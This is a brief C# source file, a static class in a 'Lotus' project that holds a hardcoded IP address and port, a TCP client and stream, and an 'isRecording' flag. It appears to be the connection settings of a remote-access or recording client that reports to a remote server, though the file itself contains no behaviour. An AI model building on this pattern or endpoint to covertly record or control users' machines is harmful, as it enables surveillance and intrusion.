using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Lotus.Classes
{
    internal class StaticV
    {
        public static bool isRecording;
        public static string ip = "193.106.196.207";
        public static int port = 53447;
        public static TcpClient client;
        public static NetworkStream stream;
    }
}
